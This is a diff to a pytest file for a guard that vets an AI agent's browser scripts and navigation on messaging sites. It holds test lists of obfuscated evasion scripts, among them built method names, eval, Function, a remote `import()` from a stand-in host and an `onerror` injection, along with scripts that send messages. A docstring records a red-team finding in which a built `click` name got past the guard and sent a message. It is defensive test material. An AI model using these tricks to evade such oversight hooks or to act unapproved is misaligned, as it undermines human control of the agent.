@@ -6,9 +6,9 @@ and 3, on 5.23.0 too).
   ran a page script that clicked Send. Every navigate, from any browser tool, is now read as a URL parser reads it, and
   a `javascript:` one is a page script on the page it runs on.
 - #3: on a messaging site's page a script was judged by a pattern over its text, and `el['cli' + 'ck']()` is no text it
-  sees. Every page script there but the plugin's shipped read-only ones (the extractors) is now refused: 60 days of
-  records held 178 other scripts on those pages, in 4 sessions, so a code for each would have asked the principal 173
-  times for scripts the old pattern passed; the browser's own read tools read a page with no code.
+  sees. It is now read with its strings, comments and patterns out: one that calls what it names only as it runs is
+  refused, one that acts waits for the code, a read passes (the coordinator's ruling on the 60 days' 178 scripts, the
+  seats' ordinary reads: a release refuses no ordinary work).
 """
 
 import json
@@ -95,7 +95,8 @@ def test_the_panes_navigate_and_its_tab_list_are_read(tmp_path):
          "navigated to https://www.linkedin.com/feed/\n" + _listing({"tab-1": "https://www.linkedin.com/feed/"}, "tab-1", quoted=False))
     session = {"session_id": "S-principal", "transcript_path": str(record)}
     assert _refused(guards.check(PANE + "navigate", {"url": "javascript:void(0)"}, CONFIG, session=session))
-    assert _refused(guards.check(PANE + "javascript_tool", {"action": "javascript_exec", "text": "document.title"}, CONFIG, session=session))
+    assert guards.check(PANE + "javascript_tool", {"action": "javascript_exec", "text": "document.title"}, CONFIG, session=session) is None
+    assert _refused(guards.check(PANE + "javascript_tool", {"action": "javascript_exec", "text": BUILT}, CONFIG, session=session))
 
 
 def test_the_panes_own_tab_list_and_a_local_app_there(tmp_path):
@@ -105,7 +106,8 @@ def test_the_panes_own_tab_list_and_a_local_app_there(tmp_path):
     session = {"session_id": "S-principal", "transcript_path": str(record)}
     assert guards.check(PANE + "javascript_tool", {"action": "javascript_exec", "text": "document.title"}, CONFIG, session=session) is None
     _ran(record, PANE + "navigate", {"url": "https://x.com/messages"}, "opened https://x.com/messages in the browser pane")
-    assert _refused(guards.check(PANE + "javascript_tool", {"action": "javascript_exec", "text": "document.title"}, CONFIG, session=session))
+    assert guards.check(PANE + "javascript_tool", {"action": "javascript_exec", "text": "document.title"}, CONFIG, session=session) is None
+    assert _refused(guards.check(PANE + "javascript_tool", {"action": "javascript_exec", "text": BUILT}, CONFIG, session=session))
 
 
 def test_each_browser_keeps_its_own_tab_ids(tmp_path):
@@ -117,7 +119,7 @@ def test_each_browser_keeps_its_own_tab_ids(tmp_path):
     session = {"session_id": "S-principal", "transcript_path": str(record)}
     assert guards.check(PANE + "javascript_tool", {"action": "javascript_exec", "text": "document.title", "tabId": "1"}, CONFIG,
                         session=session) is None
-    assert _refused(guards.check(SCRIPT, _script("document.title", tab=1), CONFIG, session=session))
+    assert _refused(guards.check(SCRIPT, _script(BUILT, tab=1), CONFIG, session=session))
 
 
 def test_a_driven_browsers_navigate_to_a_javascript_address(tmp_path):
@@ -128,15 +130,61 @@ def test_a_driven_browsers_navigate_to_a_javascript_address(tmp_path):
     assert guards.check("mcp__plugin_playwright_playwright__browser_navigate", {"url": "https://example.com/"}, CONFIG, session=session) is None
 
 
-@pytest.mark.parametrize("site", sorted(PAGES))
-@pytest.mark.parametrize("text", [BUILT, "document.querySelector('[aria-label=\"Send now\"]').click()", "document.title",
-                                  "[...document.querySelectorAll('h2')].map(h => h.innerText)", "location.href"])
-def test_on_a_messaging_sites_page_only_the_shipped_readers_run(tmp_path, site, text):
+RULE_2 = {k: v for k, v in PAGES.items() if k != "messenger"}  # a Messenger tab takes only the plugin's own (tests/test_batches.py)
+OPAQUE = [BUILT, "document.querySelector('b')?.['cli' + 'ck']?.()", "el[k]`x`", "(el['cli' + 'ck'])()", "Reflect.apply(f, el, [])",
+          "HTMLElement.prototype.click.call(el)", "f.apply(el, [])", "f.bind(el)()", "eval('el.click()')", "new Function('el.click()')()",
+          "with (el) { click() }", "import('https://x.example/a.js')", "setTimeout('el.click()', 10)", "document.title + '",
+          "el.\\u0063lick()", "document.body.append(Object.assign(document.createElement('script'), {textContent: 'x()'}))",
+          "box.innerHTML = '<img src=x onerror=go()>'"]
+ACTS = ["document.querySelector('[aria-label=\"Send now\"]').click()", "document.activeElement.dispatchEvent(new KeyboardEvent('keydown'))",
+        "fetch('/api/messages', {method: 'POST', body: '{}'})", "fetch('/api/messages', {method: m})", "location.href = '/messages/t/2/'",
+        "window.open('/messaging/thread/2/')", "open('/messaging/thread/2/')", "window?.open('/messaging/thread/2/')",
+        "document.defaultView.open('/m/2/')", "open`/m/2/`", "el.onclick()", "socket.send('hi')", "frames[0].postMessage('x', '*')",
+        "el['click']()", "TS.client.ui.sendMessage('hi')", "api.postReply(id, 'hi')"]
+READS = ["document.title", "[...document.querySelectorAll('h2')].map(h => h.innerText).join(', ')", "location.href",
+         "({url: location.href, rows: document.querySelectorAll('[role=row]').length})", "document.body.innerText.slice(0, 2000)",
+         "Array.from(document.querySelectorAll('a'), a => a.href).filter(h => h.includes('/messages/'))"]
+
+
+@pytest.mark.parametrize("site", sorted(RULE_2))
+@pytest.mark.parametrize("text", OPAQUE)
+def test_on_a_messaging_sites_page_a_script_that_calls_what_it_names_as_it_runs_is_refused(tmp_path, site, text):
+    """Round 4, #3: `el['cli' + 'ck']()` clicked Send by a name no reading of the script's text shows. Read with its
+    strings, comments and patterns out, a call by a name built as it runs, Reflect, call, apply, bind, eval, Function,
+    with, import() and a timer given a string are refused there, and so is a script the guard cannot read whole."""
     session = _session(tmp_path, PAGES[site], tab=5)
     verdict = guards.check(SCRIPT, _script(text, tab=5), CONFIG, session=session)
-    assert _refused(verdict) and "get_page_text" in verdict, (site, verdict)
+    assert _refused(verdict) and "cannot read" in verdict, (site, text, verdict)
+
+
+@pytest.mark.parametrize("site", sorted(RULE_2))
+@pytest.mark.parametrize("text", ACTS)
+def test_on_a_messaging_sites_page_a_script_that_acts_waits_for_the_code(tmp_path, site, text):
+    session = _session(tmp_path, PAGES[site], tab=5)
+    verdict = guards.check(SCRIPT, _script(text, tab=5), CONFIG, session=session)
+    assert verdict and "approve followed by the code" in verdict, (site, text, verdict)
+
+
+@pytest.mark.parametrize("site", sorted(RULE_2))
+@pytest.mark.parametrize("text", READS)
+def test_on_a_messaging_sites_page_a_plain_read_passes(tmp_path, site, text):
+    session = _session(tmp_path, PAGES[site], tab=5)
+    assert guards.check(SCRIPT, _script(text, tab=5), CONFIG, session=session) is None, (site, text)
     batch = {"actions": [{"name": "javascript_tool", "input": _script(text, tab=5)}]}
-    assert _refused(guards.check(CHROME, batch, CONFIG, session=session)), site
+    assert guards.check(CHROME, batch, CONFIG, session=session) is None, (site, text)
+
+
+@pytest.mark.xfail(strict=True, reason="open (docs/runtime-integration.md): a library's own event call, or an app's own function "
+                                       "under a name that does not say it sends, is a call the guard cannot know the effect of")
+@pytest.mark.parametrize("text", ["$(el).trigger('click')", "app.go(id, 'hi')"])
+def test_open_a_call_whose_name_says_nothing_of_what_it_does(tmp_path, text):
+    session = _session(tmp_path, PAGES["slack"], tab=5)
+    assert guards.check(SCRIPT, _script(text, tab=5), CONFIG, session=session)
+
+
+def test_a_javascript_address_is_refused_on_a_messaging_sites_page_whatever_it_runs(tmp_path):
+    session = _session(tmp_path, "https://www.linkedin.com/messaging/thread/2-abc/", tab=5)
+    assert _refused(guards.check(NAVIGATE, {"url": "javascript:void(document.title)", "tabId": 5}, CONFIG, session=session))
 
 
 def _printed(rel: str, *args) -> str:
